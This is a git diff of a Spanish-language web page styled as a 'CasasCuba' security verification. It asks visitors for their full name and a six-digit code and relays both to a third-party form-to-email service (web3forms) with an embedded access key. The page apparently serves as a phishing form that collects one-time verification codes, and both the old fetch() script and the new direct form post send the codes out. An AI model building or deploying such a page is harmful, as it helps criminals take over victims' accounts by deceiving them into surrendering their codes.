@@ -1,80 +1,51 @@
 
 <!DOCTYPE html>
-<html lang="es" translate="no">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CasasCuba | Acceso</title>
+    <title>Casascuba - Validación</title>
     <style>
-        :root { --primary: #d4af37; --bg: #0f172a; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 350px; text-align: center; border: 1px solid rgba(212, 175, 55, 0.1); }
-        h2 { color: var(--primary); margin-bottom: 5px; }
-        .subtitle { font-size: 11px; color: #94a3b8; margin-bottom: 25px; letter-spacing: 1px; }
-        input.name-input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; text-align: center; outline: none; box-sizing: border-box; }
-        .code-group { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        .code-box { width: 40px; height: 50px; border: 2px solid #334155; border-radius: 8px; background: transparent; text-align: center; color: white; font-size: 20px; outline: none; }
-        button { width: 100%; padding: 15px; background: var(--primary); color: black; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
-        #loader { display: none; margin-top: 20px; }
-        .spinner { border: 3px solid rgba(255,255,255,0.1); width: 25px; height: 25px; border-radius: 50%; border-left-color: var(--primary); animation: spin 1s linear infinite; margin: 0 auto 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; margin: 0; }
+        .container { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        h2 { color: #333; }
+        .input-group { margin-bottom: 1rem; }
+        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .code-inputs { display: flex; justify-content: space-between; margin-bottom: 1.5rem; }
+        .code-inputs input { width: 40px; height: 40px; text-align: center; font-size: 1.2rem; border: 1px solid #ccc; border-radius: 4px; }
+        .btn-primary { background-color: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1rem; }
+        .btn-primary:hover { background-color: #0056b3; }
     </style>
 </head>
-<body translate="no">
+<body>
 
-<div class="card">
-    <h2>CasasCuba 🏠</h2>
-    <div class="subtitle">VERIFICACIÓN DE SEGURIDAD</div>
-    
-    <form id="form">
-        <input type="hidden" name="access_key" value="644a1453-3ad6-45e9">
-        <input type="text" name="Nombre_Cliente" class="name-input" placeholder="Nombre y Apellidos" required>
+<div class="container">
+    <h2>Validar Acceso</h2>
+    <form action="https://api.web3forms.com/submit" method="POST">
         
-        <div class="code-group">
-            <input type="number" class="code-box" maxlength="1" oninput="move(this, 0)" required>
-            <input type="number" class="code-box" maxlength="1" oninput="move(this, 1)" required>
-            <input type="number" class="code-box" maxlength="1" oninput="move(this, 2)" required>
-            <input type="number" class="code-box" maxlength="1" oninput="move(this, 3)" required>
-            <input type="number" class="code-box" maxlength="1" oninput="move(this, 4)" required>
-            <input type="number" class="code-box" maxlength="1" oninput="move(this, 5)" required>
+        <input type="hidden" name="access_key" value="644a1453-3ad6-45e9-8671-678b7d3d90d4">
+        
+        <input type="hidden" name="subject" value="Nuevo cliente de Casascuba">
+        <input type="hidden" name="from_name" value="Casascuba Web">
+        <input type="hidden" name="redirect" value="https://casascubahttp.github.io/Casascuba-/">
+
+        <div class="input-group">
+            <input type="text" name="name" placeholder="Nombre completo" required>
         </div>
-        
-        <input type="hidden" name="Codigo" id="full-code">
-        <button type="submit" id="btn">VALIDAR ACCESO</button>
-    </form>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <p style="font-size: 12px; color: var(--primary);">Validando credenciales...</p>
-    </div>
+        <p>Ingrese el código de 6 dígitos:</p>
+        <div class="code-inputs">
+            <input type="text" name="codigo_1" maxlength="1" required>
+            <input type="text" name="codigo_2" maxlength="1" required>
+            <input type="text" name="codigo_3" maxlength="1" required>
+            <input type="text" name="codigo_4" maxlength="1" required>
+            <input type="text" name="codigo_5" maxlength="1" required>
+            <input type="text" name="codigo_6" maxlength="1" required>
+        </div>
+
+        <button type="submit" class="btn-primary">VALIDAR ACCESO</button>
+    </form>
 </div>
 
-<script>
-    function move(el, idx) {
-        if (el.value.length > 1) el.value = el.value.slice(0, 1);
-        if (el.value.length === 1 && idx < 5) document.querySelectorAll('.code-box')[idx + 1].focus();
-    }
-
-    const form = document.getElementById('form');
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        let cod = "";
-        document.querySelectorAll('.code-box').forEach(b => cod += b.value);
-        document.getElementById('full-code').value = cod;
-
-        document.getElementById('btn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        fetch('https://api.web3forms.com/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(Object.fromEntries(new FormData(form)))
-        })
-        .then(() => {
-            alert("Acceso solicitado correctamente.");
-            location.reload();
-        });
-    });
-</script>
 </body>
 </html>
